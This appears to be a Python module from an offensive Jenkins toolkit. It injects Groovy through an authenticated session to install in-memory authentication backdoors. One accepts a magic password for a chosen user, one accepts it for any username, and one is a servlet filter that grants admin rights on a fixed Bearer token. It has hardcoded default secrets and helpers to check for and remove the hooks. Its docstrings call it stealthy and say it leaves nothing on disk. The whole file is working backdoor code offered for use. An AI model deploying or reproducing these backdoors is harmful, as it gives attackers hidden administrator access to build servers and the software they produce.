"""In-memory authentication bypass via SecurityRealm hooking.

Implements runtime modification of Jenkins authentication logic without
touching disk-based configuration files, providing stealthy backdoor access.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class MemoryHookResult:
    """Result of memory hook installation."""
    success: bool
    hook_type: str
    backdoor_password: Optional[str] = None
    details: str = ""
    persistence: str = "session"


class SecurityRealmHook:
    """In-memory authentication bypass via SecurityRealm wrapping."""

    def __init__(self, session: Any):
        """Initialize SecurityRealm hook module.

        Args:
            session: Authenticated Jenkins session for Groovy execution
        """
        self.session = session

    def install_password_backdoor(self,
                                 magic_password: str = "JenkinsBackdoor2025!",
                                 target_username: str = "admin") -> MemoryHookResult:
        """Install in-memory password backdoor.

        Wraps the SecurityRealm to accept a magic password for any user,
        while preserving normal authentication for legitimate credentials.

        Args:
            magic_password: Backdoor password that grants access
            target_username: Username to grant access to (default: admin)

        Returns:
            MemoryHookResult with installation status
        """
        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.security.SecurityRealm
import org.acegisecurity.Authentication
import org.acegisecurity.AuthenticationManager
import org.acegisecurity.userdetails.UserDetailsService
import org.acegisecurity.userdetails.UserDetails
import org.acegisecurity.GrantedAuthority
import org.acegisecurity.providers.UsernamePasswordAuthenticationToken
import org.acegisecurity.GrantedAuthorityImpl

def jenkins = Jenkins.getInstance()
def originalRealm = jenkins.getSecurityRealm()

def hookedRealm = new SecurityRealm() {{

    @Override
    SecurityComponents createSecurityComponents() {{
        def originalComponents = originalRealm.createSecurityComponents()
        def originalAuthManager = originalComponents.manager

        def hookedAuthManager = new AuthenticationManager() {{
            @Override
            Authentication authenticate(Authentication auth) {{
                def username = auth.getPrincipal()
                def password = auth.getCredentials()

                if (password == '{magic_password}') {{
                    def authorities = [new GrantedAuthorityImpl('authenticated'),
                                     new GrantedAuthorityImpl('ROLE_ADMIN')] as GrantedAuthority[]

                    def user = new org.acegisecurity.userdetails.User(
                        '{target_username}',
                        '{magic_password}',
                        true, true, true, true,
                        authorities
                    )

                    return new UsernamePasswordAuthenticationToken(
                        user,
                        '{magic_password}',
                        authorities
                    )
                }} else {{
                    return originalAuthManager.authenticate(auth)
                }}
            }}
        }}

        return new SecurityComponents(hookedAuthManager, originalComponents.userDetails)
    }}

    @Override
    String getLoginUrl() {{
        return originalRealm.getLoginUrl()
    }}
}}

jenkins.setSecurityRealm(hookedRealm)

println "SUCCESS:Memory hook installed"
println "BACKDOOR_USER:{target_username}"
println "BACKDOOR_PASS:{magic_password}"
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return MemoryHookResult(
                    success=True,
                    hook_type="password_backdoor",
                    backdoor_password=magic_password,
                    details=f"Magic password '{magic_password}' grants {target_username} access. "
                           f"Survives until Jenkins restart. No config files modified.",
                    persistence="session"
                )
            else:
                return MemoryHookResult(
                    success=False,
                    hook_type="password_backdoor",
                    details=f"Failed to install hook: {result}"
                )
        except Exception as e:
            return MemoryHookResult(
                success=False,
                hook_type="password_backdoor",
                details=f"Exception during installation: {str(e)}"
            )

    def install_universal_backdoor(self, magic_password: str = "UniversalAccess!") -> MemoryHookResult:
        """Install universal backdoor allowing any username with magic password.

        Args:
            magic_password: Password that grants admin access for any username

        Returns:
            MemoryHookResult with installation status
        """
        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.security.SecurityRealm
import org.acegisecurity.Authentication
import org.acegisecurity.AuthenticationManager
import org.acegisecurity.GrantedAuthority
import org.acegisecurity.providers.UsernamePasswordAuthenticationToken
import org.acegisecurity.GrantedAuthorityImpl

def jenkins = Jenkins.getInstance()
def originalRealm = jenkins.getSecurityRealm()

def hookedRealm = new SecurityRealm() {{

    @Override
    SecurityComponents createSecurityComponents() {{
        def originalComponents = originalRealm.createSecurityComponents()
        def originalAuthManager = originalComponents.manager

        def hookedAuthManager = new AuthenticationManager() {{
            @Override
            Authentication authenticate(Authentication auth) {{
                def username = auth.getPrincipal()
                def password = auth.getCredentials()

                if (password == '{magic_password}') {{
                    def authorities = [new GrantedAuthorityImpl('authenticated'),
                                     new GrantedAuthorityImpl('ROLE_ADMIN')] as GrantedAuthority[]

                    def user = new org.acegisecurity.userdetails.User(
                        username.toString(),
                        '{magic_password}',
                        true, true, true, true,
                        authorities
                    )

                    return new UsernamePasswordAuthenticationToken(
                        user,
                        '{magic_password}',
                        authorities
                    )
                }} else {{
                    return originalAuthManager.authenticate(auth)
                }}
            }}
        }}

        return new SecurityComponents(hookedAuthManager, originalComponents.userDetails)
    }}

    @Override
    String getLoginUrl() {{
        return originalRealm.getLoginUrl()
    }}
}}

jenkins.setSecurityRealm(hookedRealm)

println "SUCCESS:Universal backdoor installed"
println "BACKDOOR_PASS:{magic_password}"
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return MemoryHookResult(
                    success=True,
                    hook_type="universal_backdoor",
                    backdoor_password=magic_password,
                    details=f"ANY username + password '{magic_password}' grants admin access. "
                           f"Zero disk footprint. Clears on restart.",
                    persistence="session"
                )
            else:
                return MemoryHookResult(
                    success=False,
                    hook_type="universal_backdoor",
                    details=f"Failed to install universal backdoor: {result}"
                )
        except Exception as e:
            return MemoryHookResult(
                success=False,
                hook_type="universal_backdoor",
                details=f"Exception: {str(e)}"
            )

    def install_token_backdoor(self, bearer_token: str = "Bearer-Admin-Token-2025") -> MemoryHookResult:
        """Install HTTP header-based authentication backdoor.

        Grants admin access when specific Bearer token is present in request headers.

        Args:
            bearer_token: Token value to check in Authorization header

        Returns:
            MemoryHookResult with installation status
        """
        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.security.SecurityRealm
import javax.servlet.Filter
import javax.servlet.FilterChain
import javax.servlet.FilterConfig
import javax.servlet.ServletRequest
import javax.servlet.ServletResponse
import javax.servlet.http.HttpServletRequest
import javax.servlet.http.HttpServletResponse
import org.acegisecurity.context.SecurityContextHolder
import org.acegisecurity.providers.UsernamePasswordAuthenticationToken
import org.acegisecurity.GrantedAuthorityImpl
import org.acegisecurity.GrantedAuthority

def jenkins = Jenkins.getInstance()

def backdoorFilter = new Filter() {{

    void init(FilterConfig config) {{}}

    void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {{
        if (request instanceof HttpServletRequest) {{
            def httpReq = (HttpServletRequest) request
            def authHeader = httpReq.getHeader("Authorization")

            if (authHeader && authHeader == "Bearer {bearer_token}") {{
                def authorities = [new GrantedAuthorityImpl('authenticated'),
                                 new GrantedAuthorityImpl('ROLE_ADMIN')] as GrantedAuthority[]

                def auth = new UsernamePasswordAuthenticationToken(
                    "backdoor-admin",
                    "",
                    authorities
                )

                SecurityContextHolder.getContext().setAuthentication(auth)
            }}
        }}

        chain.doFilter(request, response)
    }}

    void destroy() {{}}
}}

def pluginManager = jenkins.getPluginManager()
def webApp = jenkins.servletContext

try {{
    webApp.addFilter("BackdoorAuthFilter", backdoorFilter)
        .addMappingForUrlPatterns(null, false, "/*")

    println "SUCCESS:Token backdoor installed"
    println "BEARER_TOKEN:{bearer_token}"
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return MemoryHookResult(
                    success=True,
                    hook_type="bearer_token",
                    backdoor_password=bearer_token,
                    details=f"Add 'Authorization: Bearer {bearer_token}' header to any request for admin access. "
                           f"Works with API calls and web UI. Session-only persistence.",
                    persistence="session"
                )
            else:
                return MemoryHookResult(
                    success=False,
                    hook_type="bearer_token",
                    details=f"Installation failed: {result}"
                )
        except Exception as e:
            return MemoryHookResult(
                success=False,
                hook_type="bearer_token",
                details=f"Exception: {str(e)}"
            )

    def check_hook_active(self) -> bool:
        """Check if a memory hook is currently active.

        Returns:
            True if SecurityRealm appears to be hooked
        """
        groovy_code = """
import jenkins.model.Jenkins

def jenkins = Jenkins.getInstance()
def realm = jenkins.getSecurityRealm()
def realmClass = realm.getClass().getName()

println "REALM_CLASS:" + realmClass

if (realmClass.contains('$') || !realmClass.contains('.')) {
    println "LIKELY_HOOKED:true"
} else {
    println "LIKELY_HOOKED:false"
}
"""

        try:
            result = self.session.execute_groovy(groovy_code)
            return "LIKELY_HOOKED:true" in result
        except Exception:
            return False

    def remove_hooks(self) -> tuple[bool, str]:
        """Attempt to remove installed hooks by reloading original config.

        Returns:
            Tuple of (success, message)
        """
        groovy_code = """
import jenkins.model.Jenkins

try {
    def jenkins = Jenkins.getInstance()
    jenkins.doReload()
    println "SUCCESS:Configuration reloaded, hooks cleared"
} catch (Exception e) {
    println "ERROR:" + e.message
}
"""

        try:
            result = self.session.execute_groovy(groovy_code)
            if "SUCCESS" in result:
                return True, "Jenkins configuration reloaded, memory hooks cleared"
            else:
                return False, result
        except Exception as e:
            return False, str(e)


def install_password_backdoor(session: Any,
                              magic_password: str = "JenkinsBackdoor2025!") -> MemoryHookResult:
    """Quick install of password backdoor.

    Args:
        session: Jenkins session
        magic_password: Backdoor password

    Returns:
        MemoryHookResult with status
    """
    hook = SecurityRealmHook(session)
    return hook.install_password_backdoor(magic_password)


def install_universal_backdoor(session: Any,
                               magic_password: str = "UniversalAccess!") -> MemoryHookResult:
    """Quick install of universal username backdoor.

    Args:
        session: Jenkins session
        magic_password: Magic password

    Returns:
        MemoryHookResult with status
    """
    hook = SecurityRealmHook(session)
    return hook.install_universal_backdoor(magic_password)


def install_token_backdoor(session: Any,
                           bearer_token: str = "Bearer-Admin-Token-2025") -> MemoryHookResult:
    """Quick install of Bearer token backdoor.

    Args:
        session: Jenkins session
        bearer_token: Bearer token value

    Returns:
        MemoryHookResult with status
    """
    hook = SecurityRealmHook(session)
    return hook.install_token_backdoor(bearer_token)
